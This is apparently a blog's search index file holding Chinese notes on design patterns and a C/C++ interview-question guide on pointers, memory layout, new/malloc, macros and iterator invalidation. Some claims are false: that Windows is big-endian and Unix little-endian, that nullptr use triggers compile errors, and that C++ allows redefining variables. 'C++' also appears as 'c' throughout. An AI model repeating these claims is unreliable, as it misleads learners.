<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>设计模式</title>
      <link href="/2022/10/06/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2022/10/06/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h1><p>利用封装，多态和继承，考虑用一个单独的类来做创造实例的过程。</p><h1 id="策略模式"><a href="#策略模式" class="headerlink" title="策略模式"></a>策略模式</h1><p>定义了算法家族，分别封装，让他们之间可以互相替换，此模式让算法的变化，不会影响到使用算法的客户。</p><p>所有这些算法完成的都是相同的工作，只是实现不同，它可以以相同的方式调用所有的算法，减少了各种算法类与使用算法类之间的耦合。即策略模式封装了变化。</p><h1 id="单一职责模式"><a href="#单一职责模式" class="headerlink" title="单一职责模式"></a>单一职责模式</h1>]]></content>
      
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面经</title>
      <link href="/2022/09/29/%E9%9D%A2%E7%BB%8F/"/>
      <url>/2022/09/29/%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<p><h1 align="center">InterviewGuide</h1></p><p><div align="left"></p><p>计算机校招、社招面试常见八股文整理，也是<strong>《逆袭进大厂》</strong>的唯一仓库.目前已收录 <strong>C/c 、操作系统、数据结构、计算机网络、MySQL、Redis</strong>等面试资料，未来打算继续收录<strong>Java、Python、Go</strong>等面试常见问题，坚持将此仓库维护下去。</p><span id="more"></span><p><b><details><summary>:orange_book: PDF下载地址与仓库事宜</summary></b></p><p> :book:PDF下载方式： 请移步本人公众号『<a href="https://mp.weixin.qq.com/s?__biz=Mzg2MDU0ODM3MA==&amp;mid=100000332&amp;idx=1&amp;sn=9dd24307b7e963174ee8429827542318&amp;chksm=4e25fe3179527727ac563214c69fe6ac354ab4383c652d9b3e9e03d70dc48df4ad929e076ce3#rd">拓跋阿秀</a>』下回复关键字『<strong>逆袭进大厂</strong>』即可下载最新PDF版本，不断更新迭代最新版本~</p><p>🙏 本仓库脱胎于阿秀 <strong>2021</strong> 年秋招时期总结的面试笔记，我自己也是凭借这份笔记成功体验到一份 <strong>offer 收割机</strong> 的快乐，阿秀秋招总结可看<a href="https://mp.weixin.qq.com/s/AYe3tnuOmqR4jdDndDGW-Q">秋招总结文章</a>，现将个人笔记整理开源出来，造福每位像我这样的渣渣~</p><p>由于本人水平有限，仓库内容如有错误，欢迎提交 <strong>issue</strong>，虚心接受每一位好心人的建议与意见。</p><p>另仓库中的全部知识点均来自本人学习总结、读书笔记、经典书籍、网络博文等，阿秀已经尽自己最大能力找到当时搜集面试题时的出处并注明了。如有遗漏与侵权，请 <strong>issue</strong> 提出，感激不尽。</p><p>转载请注明出处，不得用于商业目的。</p><p>&lt;/details&gt;</p><h2 id="📚-目录"><a href="#📚-目录" class="headerlink" title="📚 目录"></a>📚 目录</h2><ul><li>:anguished:<a href="#cpp">C/c</a></li><li>:disappointed_relieved:<a href="#os">操作系统</a></li><li>:sob:<a href="#network">计算机网络</a> </li><li>:scream:<a href="#algorithm">数据结构与算法</a></li><li>:tired_face:<a href="#db">数据库(MySQL、Redis)</a></li><li>:sweat:<a href="#qingjingti">常见智力题、情景题</a></li><li>:grin:<a href="#feijishu">常见非技术性问题(比如你最大的缺点是什么)</a></li><li>:dog:<a href="#other">未完待续…..</a></li></ul><p><a id="cpp"></a></p><h2 id="anguished-C-c"><a href="#anguished-C-c" class="headerlink" title=":anguished:C/c"></a>:anguished:C/c</h2><h4 id="1、在main执行之前和之后执行的代码可能是什么？"><a href="#1、在main执行之前和之后执行的代码可能是什么？" class="headerlink" title="1、在main执行之前和之后执行的代码可能是什么？"></a>1、在main执行之前和之后执行的代码可能是什么？</h4><p><strong>main函数执行之前</strong>，主要就是初始化系统相关资源：</p><ul><li>设置栈指针</li><li>初始化静态<code>static</code>变量和<code>global</code>全局变量，即<code>.data</code>段的内容</li><li>将未初始化部分的全局变量赋初值：数值型<code>short</code>，<code>int</code>，<code>long</code>等为<code>0</code>，<code>bool</code>为<code>FALSE</code>，指针为<code>NULL</code>等等，即<code>.bss</code>段的内容     </li><li>全局对象初始化，在<code>main</code>之前调用构造函数，这是可能会执行前的一些代码</li><li>将main函数的参数<code>argc</code>，<code>argv</code>等传递给<code>main</code>函数，然后才真正运行<code>main</code>函数</li><li><strong>attribute</strong>((constructor)) </li></ul><p><strong>main函数执行之后</strong>：  </p><ul><li>全局对象的析构函数会在main函数之后执行； </li><li>可以用 <strong><code>atexit</code></strong> 注册一个函数，它会在main 之后执行;</li><li><strong>attribute</strong>((destructor)) </li></ul><h4 id="2、结构体内存对齐问题？"><a href="#2、结构体内存对齐问题？" class="headerlink" title="2、结构体内存对齐问题？"></a>2、结构体内存对齐问题？</h4><ul><li><p>结构体内成员按照声明顺序存储，第一个成员地址和整个结构体地址相同。</p></li><li><p>未特殊说明时，按结构体中size最大的成员对齐（若有double成员，按8字节对齐。）</p></li></ul><h4 id="3、指针和引用的区别"><a href="#3、指针和引用的区别" class="headerlink" title="3、指针和引用的区别"></a>3、指针和引用的区别</h4><ul><li>指针是一个变量，存储的是一个地址，引用跟原来的变量实质上是同一个东西，是原变量的别名</li><li>指针可以有多级，引用只有一级</li><li>指针可以为空，引用不能为NULL且在定义时必须初始化</li><li>指针在初始化后可以改变指向，而引用在初始化之后不可再改变</li><li>sizeof指针得到的是本指针的大小，sizeof引用得到的是引用所指向变量的大小</li><li>当把指针作为参数进行传递时，也是将实参的一个拷贝传递给形参，两者指向的地址相同，但不是同一个变量，在函数中改变这个变量的指向不影响实参，而引用却可以。</li><li>引用本质是一个指针，同样会占4字节内存；指针是具体变量，需要占用存储空间（，具体情况还要具体分析）。</li><li>引用在声明时必须初始化为另一变量，一旦出现必须为typename refname &amp;varname形式；指针声明和定义可以分开，可以先只声明指针变量而不初始化，等用到时再指向具体变量。</li><li>引用一旦初始化之后就不可以再改变（变量可以被引用为多次，但引用只能作为一个变量引用）；指针变量可以重新指向别的变量。</li><li>不存在指向空值的引用，必须有具体实体；但是存在指向空值的指针。</li></ul><p>参考代码：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>　　<span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>　　p<span class="token operator">=</span><span class="token operator">&amp;</span>a<span class="token punctuation">;</span>　　cout<span class="token operator">&lt;&lt;</span>p<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token operator">&lt;&lt;</span><span class="token operator">*</span>p<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> <span class="token operator">*</span>p<span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">test</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"指针p为NULL"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//运行结果为：</span><span class="token comment">//0x22ff44 1</span><span class="token comment">//指针p为NULL</span><span class="token keyword">void</span> <span class="token function">testPTR</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>p <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">testREFF</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">&amp;</span> p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>p <span class="token operator">=</span> a<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span><span class="token operator">*</span> b <span class="token operator">=</span> <span class="token operator">&amp;</span>a<span class="token punctuation">;</span><span class="token function">testPTR</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//改变指针指向，但是没改变指针的所指的内容</span>cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token comment">// 10</span>cout <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>b <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token comment">// 10</span>a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token function">testREFF</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> a <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token comment">//12</span><span class="token punctuation">&#125;</span></code></pre><p> 在编译器看来, int a = 10; int &amp;b = a; 等价于 int <em> const b = &amp;a; 而 b = 20; 等价于 </em>b = 20; 自动转换为指针和自动解引用. </p><h4 id="4、堆和栈的区别"><a href="#4、堆和栈的区别" class="headerlink" title="4、堆和栈的区别"></a>4、堆和栈的区别</h4><ul><li><p>申请方式不同。</p><ul><li>栈由系统自动分配。</li></ul></li><li><p>堆是自己申请和释放的。</p></li><li><p>申请大小限制不同。</p><ul><li><p>栈顶和栈底是之前预设好的，栈是向栈底扩展，大小固定，可以通过ulimit -a查看，由ulimit -s修改。</p></li><li><p>堆向高地址扩展，是不连续的内存区域，大小可以灵活调整。</p></li></ul></li><li><p>申请效率不同。</p><ul><li><p>栈由系统分配，速度快，不会有碎片。</p></li><li><p>堆由程序员分配，速度慢，且会有碎片。</p></li></ul></li></ul><p>   栈空间默认是4M, 堆区一般是 1G - 4G </p><div class="table-container"><table><thead><tr><th style="text-align:left"></th><th>堆</th><th>栈</th></tr></thead><tbody><tr><td style="text-align:left"><strong>管理方式</strong></td><td>堆中资源由程序员控制（容易产生memory leak）</td><td>栈资源由编译器自动管理，无需手工控制</td></tr><tr><td style="text-align:left"><strong>内存管理机制</strong></td><td>系统有一个记录空闲内存地址的链表，当系统收到程序申请时，遍历该链表，寻找第一个空间大于申请空间的堆结点，删    除空闲结点链表中的该结点，并将该结点空间分配给程序（大多数系统会在这块内存空间首地址记录本次分配的大小，这样delete才能正确释放本内存空间，另外系统会将多余的部分重新放入空闲链表中）</td><td>只要栈的剩余空间大于所申请空间，系统为程序提供内存，否则报异常提示栈溢出。（这一块理解一下链表和队列的区别，不连续空间和连续空间的区别，应该就比较好理解这两种机制的区别了）</td></tr><tr><td style="text-align:left"><strong>空间大小</strong></td><td>堆是不连续的内存区域（因为系统是用链表来存储空闲内存地址，自然不是连续的），堆大小受限于计算机系统中有效的虚拟内存（32bit  系统理论上是4G），所以堆的空间比较灵活，比较大</td><td>栈是一块连续的内存区域，大小是操作系统预定好的，windows下栈大小是2M（也有是1M，在  编译时确定，VC中可设置）</td></tr><tr><td style="text-align:left"><strong>碎片问题</strong></td><td>对于堆，频繁的new/delete会造成大量碎片，使程序效率降低</td><td>对于栈，它是有点类似于数据结构上的一个先进后出的栈，进出一一对应，不会产生碎片。（看到这里我突然明白了为什么面试官在问我堆和栈的区别之前先问了我栈和队列的区别）</td></tr><tr><td style="text-align:left"><strong>生长方向</strong></td><td>堆向上，向高地址方向增长。</td><td>栈向下，向低地址方向增长。</td></tr><tr><td style="text-align:left"><strong>分配方式</strong></td><td>堆都是动态分配（没有静态分配的堆）</td><td>栈有静态分配和动态分配，静态分配由编译器完成（如局部变量分配），动态分配由alloca函数分配，但栈的动态分配的资源由编译器进行释放，无需程序员实现。</td></tr><tr><td style="text-align:left"><strong>分配效率</strong></td><td>堆由C/c函数库提供，机制很复杂。所以堆的效率比栈低很多。</td><td>栈是其系统提供的数据结构，计算机在底层对栈提供支持，分配专门  寄存器存放栈地址，栈操作有专门指令。</td></tr></tbody></table></div><p><strong>形象的比喻</strong></p><p>栈就像我们去饭馆里吃饭，只管点菜（发出申请）、付钱、和吃（使用），吃饱了就走，不必理会切菜、洗菜等准备工作和洗碗、刷锅等扫尾工作，他的好处是快捷，但是自由度小。</p><p>堆就象是自己动手做喜欢吃的菜肴，比较麻烦，但是比较符合自己的口味，而且自由度大。</p><blockquote><p>《c中堆（heap）和栈(stack)的区别》：<a href="https://blog.csdn.net/qq_34175893/article/details/83502412">https://blog.csdn.net/qq_34175893/article/details/83502412</a></p></blockquote><h4 id="5、区别以下指针类型？"><a href="#5、区别以下指针类型？" class="headerlink" title="5、区别以下指针类型？"></a>5、区别以下指针类型？</h4><pre class="language-none"><code class="language-none">int *p[10]int (*p)[10]int *p(int)int (*p)(int)</code></pre><ul><li><p>int *p[10]表示指针数组，强调数组概念，是一个数组变量，数组大小为10，数组内每个元素都是指向int类型的指针变量。</p></li><li><p>int (*p)[10]表示数组指针，强调是指针，只有一个变量，是指针类型，不过指向的是一个int类型的数组，这个数组大小是10。</p></li><li><p>int <em>p(int)是函数声明，函数名是p，参数是int类型的，返回值是int </em>类型的。</p></li><li><p>int (*p)(int)是函数指针，强调是指针，该指针指向的函数具有int类型参数，并且返回值是int类型的。</p></li></ul><h4 id="6、基类的虚函数表存放在内存的什么区，虚表指针vptr的初始化时间"><a href="#6、基类的虚函数表存放在内存的什么区，虚表指针vptr的初始化时间" class="headerlink" title="6、基类的虚函数表存放在内存的什么区，虚表指针vptr的初始化时间"></a>6、基类的虚函数表存放在内存的什么区，虚表指针vptr的初始化时间</h4><p>首先整理一下虚函数表的特征：</p><ul><li><p>虚函数表是全局共享的元素，即全局仅有一个，在编译时就构造完成</p></li><li><p>虚函数表类似一个数组，类对象中存储vptr指针，指向虚函数表，即虚函数表不是函数，不是程序代码，不可能存储在代码段</p></li><li><p>虚函数表存储虚函数的地址,即虚函数表的元素是指向类成员函数的指针,而类中虚函数的个数在编译时期可以确定，即虚函数表的大小可以确定,即大小是在编译时期确定的，不必动态分配内存空间存储虚函数表，所以不在堆中</p></li></ul><p>根据以上特征，虚函数表类似于类中静态成员变量.静态成员变量也是全局共享，大小确定，因此最有可能存在全局数据区，测试结果显示：</p><p>虚函数表vtable在Linux/Unix中存放在可执行文件的只读数据段中(rodata)，这与微软的编译器将虚函数表存放在常量段存在一些差别</p><p>由于虚表指针vptr跟虚函数密不可分，对于有虚函数或者继承于拥有虚函数的基类，对该类进行实例化时，在构造函数执行时会对虚表指针进行初始化，并且存在对象内存布局的最前面。</p><blockquote><p>《虚函数表存放在哪里》：<a href="https://blog.csdn.net/u013270326/article/details/82830656">https://blog.csdn.net/u013270326/article/details/82830656</a></p></blockquote><p>一般分为五个区域：栈区、堆区、函数区（存放函数体等二进制代码）、全局静态区、常量区</p><p>c中<strong>虚函数表位于只读数据段（.rodata），也就是c内存模型中的常量区；而虚函数则位于代码段（.text），也就是c内存模型中的代码区。</strong> </p><h4 id="7、new-delete-与-malloc-free的异同"><a href="#7、new-delete-与-malloc-free的异同" class="headerlink" title="7、new / delete 与 malloc / free的异同"></a>7、new / delete 与 malloc / free的异同</h4><p><strong>相同点</strong></p><ul><li>都可用于内存的动态申请和释放</li></ul><p><strong>不同点</strong></p><ul><li>前者是c运算符，后者是C/c语言标准库函数</li><li>new自动计算要分配的空间大小，malloc需要手工计算</li><li>new是类型安全的，malloc不是。例如：</li></ul><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> new <span class="token keyword">float</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//编译错误</span><span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//编译无错误</span></code></pre><ul><li>new调用名为<strong>operator new</strong>的标准库函数分配足够空间并调用相关对象的构造函数，delete对指针所指对象运行适当的析构函数；然后通过调用名为<strong>operator delete</strong>的标准库函数释放该对象所用内存。后者均没有相关调用</li><li>后者需要库文件支持，前者不用</li><li>new是封装了malloc，直接free不会报错，但是这只是释放内存，而不会析构对象 </li></ul><h4 id="8、new和delete是如何实现的？"><a href="#8、new和delete是如何实现的？" class="headerlink" title="8、new和delete是如何实现的？"></a>8、new和delete是如何实现的？</h4><ul><li>new的实现过程是：首先调用名为<strong>operator new</strong>的标准库函数，分配足够大的原始为类型化的内存，以保存指定类型的一个对象；接下来运行该类型的一个构造函数，用指定初始化构造对象；最后返回指向新分配并构造后的的对象的指针</li><li>delete的实现过程：对指针指向的对象运行适当的析构函数；然后通过调用名为<strong>operator delete</strong>的标准库函数释放该对象所用内存</li></ul><h4 id="9、malloc和new的区别？"><a href="#9、malloc和new的区别？" class="headerlink" title="9、malloc和new的区别？"></a>9、malloc和new的区别？</h4><ul><li><p>malloc和free是标准库函数，支持覆盖；new和delete是运算符，并且支持重载。</p></li><li><p>malloc仅仅分配内存空间，free仅仅回收空间，不具备调用构造函数和析构函数功能，用malloc分配空间存储类的对象存在风险；new和delete除了分配回收功能外，还会调用构造函数和析构函数。</p></li><li><p>malloc和free返回的是void类型指针（必须进行类型转换），new和delete返回的是具体类型指针。</p></li></ul><h4 id="9-1、delete和delete-区别？-补充"><a href="#9-1、delete和delete-区别？-补充" class="headerlink" title="9.1、delete和delete[]区别？(补充)"></a><strong>9.1、delete和delete[]区别？(补充)</strong></h4><ul><li>delete只会调用一次析构函数。</li><li>delete[]会调用数组中每个元素的析构函数。</li></ul><h4 id="10、宏定义和函数有何区别？"><a href="#10、宏定义和函数有何区别？" class="headerlink" title="10、宏定义和函数有何区别？"></a>10、宏定义和函数有何区别？</h4><ul><li><p>宏在编译时完成替换，之后被替换的文本参与编译，相当于直接插入了代码，运行时不存在函数调用，执行起来更快；函数调用在运行时需要跳转到具体调用函数。</p></li><li><p>宏定义属于在结构中插入代码，没有返回值；函数调用具有返回值。</p></li><li><p>宏定义参数没有类型，不进行类型检查；函数参数具有类型，需要检查类型。</p></li><li><p>宏定义不要在最后加分号。</p></li></ul><h4 id="11、宏定义和typedef区别？"><a href="#11、宏定义和typedef区别？" class="headerlink" title="11、宏定义和typedef区别？"></a>11、宏定义和typedef区别？</h4><ul><li><p>宏主要用于定义常量及书写复杂的内容；typedef主要用于定义类型别名。</p></li><li><p>宏替换发生在编译阶段之前，属于文本插入替换；typedef是编译的一部分。</p></li><li><p>宏不检查类型；typedef会检查数据类型。</p></li><li><p>宏不是语句，不在在最后加分号；typedef是语句，要加分号标识结束。</p></li><li><p>注意对指针的操作，typedef char <em> p_char和#define p_char char </em>区别巨大。</p></li></ul><h4 id="12、变量声明和定义区别？"><a href="#12、变量声明和定义区别？" class="headerlink" title="12、变量声明和定义区别？"></a>12、变量声明和定义区别？</h4><ul><li><p>声明仅仅是把变量的声明的位置及类型提供给编译器，并不分配内存空间；定义要在定义的地方为其分配存储空间。</p></li><li><p>相同变量可以在多处声明（外部变量extern），但只能在一处定义。</p></li></ul><h4 id="13、哪几种情况必须用到初始化成员列表？"><a href="#13、哪几种情况必须用到初始化成员列表？" class="headerlink" title="13、哪几种情况必须用到初始化成员列表？"></a>13、哪几种情况必须用到初始化成员列表？</h4><ul><li><p>初始化一个const成员。</p></li><li><p>初始化一个reference成员。</p></li><li><p>调用一个基类的构造函数，而该函数有一组参数。</p></li><li><p>调用一个数据成员对象的构造函数，而该函数有一组参数。</p></li></ul><h4 id="14、strlen和sizeof区别？"><a href="#14、strlen和sizeof区别？" class="headerlink" title="14、strlen和sizeof区别？"></a>14、strlen和sizeof区别？</h4><ul><li><p>sizeof是运算符，并不是函数，结果在编译时得到而非运行中获得；strlen是字符处理的库函数。</p></li><li><p>sizeof参数可以是任何数据的类型或者数据（sizeof参数不退化）；strlen的参数只能是字符指针且结尾是’\0’的字符串。</p></li><li><p>因为sizeof值在编译时确定，所以不能用来得到动态分配（运行时分配）存储空间的大小。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str <span class="token operator">=</span> <span class="token string">"name"</span><span class="token punctuation">;</span>    <span class="token keyword">sizeof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 取的是指针str的长度，是8</span>    <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 取的是这个字符串的长度，不包含结尾的 \0。大小是4</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="15、常量指针和指针常量区别？"><a href="#15、常量指针和指针常量区别？" class="headerlink" title="15、常量指针和指针常量区别？"></a>15、常量指针和指针常量区别？</h4><ul><li><p>常量指针是一个指针，读成常量的指针，指向一个只读变量。如int const <em>p或const int </em>p。</p></li><li><p>指针常量是一个不能给改变指向的指针。指针是个常亮，不能中途改变指向，如int *const p。</p></li></ul><h4 id="16、a和-amp-a有什么区别？"><a href="#16、a和-amp-a有什么区别？" class="headerlink" title="16、a和&amp;a有什么区别？"></a>16、a和&amp;a有什么区别？</h4><pre class="language-none"><code class="language-none">假设数组int a[10];int (*p)[10] &#x3D; &amp;a;</code></pre><ul><li>a是数组名，是数组首元素地址，+1表示地址值加上一个int类型的大小，如果a的值是0x00000001，加1操作后变为0x00000005。*(a + 1) = a[1]。</li><li>&amp;a是数组的指针，其类型为int (*)[10]（就是前面提到的数组指针），其加1时，系统会认为是数组首地址加上整个数组的偏移（10个int型变量），值为数组a尾元素后一个元素的地址。</li><li>若(int <em>)p ，此时输出 </em>p时，其值为a[0]的值，因为被转为int *类型，解引用时按照int类型大小来读取。</li></ul><h4 id="17、数组名和指针（这里为指向数组首元素的指针）区别？"><a href="#17、数组名和指针（这里为指向数组首元素的指针）区别？" class="headerlink" title="17、数组名和指针（这里为指向数组首元素的指针）区别？"></a>17、数组名和指针（这里为指向数组首元素的指针）区别？</h4><ul><li><p>二者均可通过增减偏移量来访问数组中的元素。</p></li><li><p>数组名不是真正意义上的指针，可以理解为常指针，所以数组名没有自增、自减等操作。</p></li><li><p><strong>当数组名当做形参传递给调用函数后，就失去了原有特性，退化成一般指针，多了自增、自减操作，但sizeof运算符不能再得到原数组的大小了。</strong></p></li></ul><h4 id="18、野指针和悬空指针"><a href="#18、野指针和悬空指针" class="headerlink" title="18、野指针和悬空指针"></a>18、野指针和悬空指针</h4><p>  都是是指向无效内存区域(这里的无效指的是”不安全不可控”)的指针，访问行为将会导致未定义行为。</p><ul><li><p>野指针<br>野指针，指的是没有被初始化过的指针</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">int</span><span class="token operator">*</span> p<span class="token punctuation">;</span>     <span class="token comment">// 未初始化</span>    std<span class="token double-colon punctuation">::</span>cout<span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>p <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span> <span class="token comment">// 未初始化就被使用</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>因此，为了防止出错，对于指针初始化时都是赋值为 <code>nullptr</code>，这样在使用时编译器就会直接报错，产生非法内存访问。</p></li><li><p>悬空指针<br>悬空指针，指针最初指向的内存已经被释放了的一种指针。</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">int</span> <span class="token operator">*</span> p <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>  <span class="token keyword">int</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">;</span>    p <span class="token operator">=</span> p2<span class="token punctuation">;</span>  <span class="token keyword">delete</span> p2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>此时 p和p2就是悬空指针，指向的内存已经被释放。继续使用这两个指针，行为不可预料。需要设置为<code>p=p2=nullptr</code>。此时再使用，编译器会直接保错。</p><p>避免野指针比较简单，但悬空指针比较麻烦。c引入了智能指针，c智能指针的本质就是避免悬空指针的产生。</p></li></ul><p>产生原因及解决办法：</p><p>野指针：指针变量未及时初始化 =&gt; 定义指针变量及时初始化，要么置空。</p><p>悬空指针：指针free或delete之后没有及时置空 =&gt; 释放操作后立即置空。</p><h4 id="19、迭代器失效的情况"><a href="#19、迭代器失效的情况" class="headerlink" title="19、迭代器失效的情况"></a>19、迭代器失效的情况</h4><p>以vector为例：</p><p><strong>插入元素：</strong></p><p>1、尾后插入：size &lt; capacity时，首迭代器不失效尾迭代失效（未重新分配空间），size == capacity时，所有迭代器均失效（需要重新分配空间）。</p><p>2、中间插入：中间插入：size &lt; capacity时，首迭代器不失效但插入元素之后所有迭代器失效，size == capacity时，所有迭代器均失效。</p><p><strong>删除元素：</strong></p><p>尾后删除：只有尾迭代失效。</p><p>中间删除：删除位置之后所有迭代失效。</p><p> deque 和 vector 的情况类似, </p><p>而list双向链表每一个节点内存不连续, 删除节点仅当前迭代器失效,erase返回下一个有效迭代器; </p><p>map/set等关联容器底层是红黑树删除节点不会影响其他节点的迭代器, 使用递增方法获取下一个迭代器 mmp.erase(iter++); </p><p>unordered_(hash) 迭代器意义不大, rehash之后, 迭代器应该也是全部失效. </p><h4 id="20、C和c的区别"><a href="#20、C和c的区别" class="headerlink" title="20、C和c的区别"></a>20、C和c的区别</h4><ul><li>c中new和delete是对内存分配的运算符，取代了C中的malloc和free。</li><li>标准c中的字符串类取代了标准C函数库头文件中的字符数组处理函数（C中没有字符串类型）。</li><li>c中用来做控制态输入输出的iostream类库替代了标准C中的stdio函数库。</li><li>c中的try/catch/throw异常处理机制取代了标准C中的setjmp()和longjmp()函数。</li><li>在c中，允许有相同的函数名，不过它们的参数类型不能完全相同，这样这些函数就可以相互区别开来。而这在C语言中是不允许的。也就是c可以重载，C语言不允许。</li><li>c语言中，允许变量定义语句在程序中的任何地方，只要在是使用它之前就可以；而C语言中，必须要在函数开头部分。而且c允许重复定义变量，C语言也是做不到这一点的</li><li>在c中，除了值和指针之外，新增了引用。引用型变量是其他变量的一个别名，我们可以认为他们只是名字不相同，其他都是相同的。</li><li>c相对与C增加了一些关键字，如：bool、using、dynamic_cast、namespace等等</li></ul><blockquote><p>《<a href="https://www.cnblogs.com/ITziyuan/p/9487760.html">C语言与c有什么区别？</a>》<a href="https://www.cnblogs.com/ITziyuan/p/9487760.html">https://www.cnblogs.com/ITziyuan/p/9487760.html</a></p></blockquote><h4 id="21-c与Java的区别"><a href="#21-c与Java的区别" class="headerlink" title="21.c与Java的区别"></a>21.c与Java的区别</h4><p><strong>语言特性</strong></p><ul><li>Java语言给开发人员提供了更为简洁的语法；完全面向对象，由于JVM可以安装到任何的操作系统上，所以说它的可移植性强</li><li><p>Java语言中没有指针的概念，引入了真正的数组。不同于c中利用指针实现的“伪数组”，Java引入了真正的数组，同时将容易造成麻烦的指针从语言中去掉，这将有利于防止在c程序中常见的因为数组操作越界等指针操作而对系统数据进行非法读写带来的不安全问题</p></li><li><p>c也可以在其他系统运行，但是需要不同的编码（这一点不如Java，只编写一次代码，到处运行），例如对一个数字，在windows下是大端存储，在unix中则为小端存储。Java程序一般都是生成字节码，在JVM里面运行得到结果</p></li><li>Java用接口(Interface)技术取代c程序中的多继承性。接口与多继承有同样的功能，但是省却了多继承在实现和维护上的复杂性</li></ul><p><strong>垃圾回收</strong></p><ul><li>c用析构函数回收垃圾，写C和c程序时一定要注意内存的申请和释放</li><li>Java语言不使用指针，内存的分配和回收都是自动进行的，程序员无须考虑内存碎片的问题</li></ul><p><strong>应用场景</strong></p><ul><li>Java在桌面程序上不如c实用，c可以直接编译成exe文件，指针是c的优势，可以直接对内存的操作，但同时具有危险性 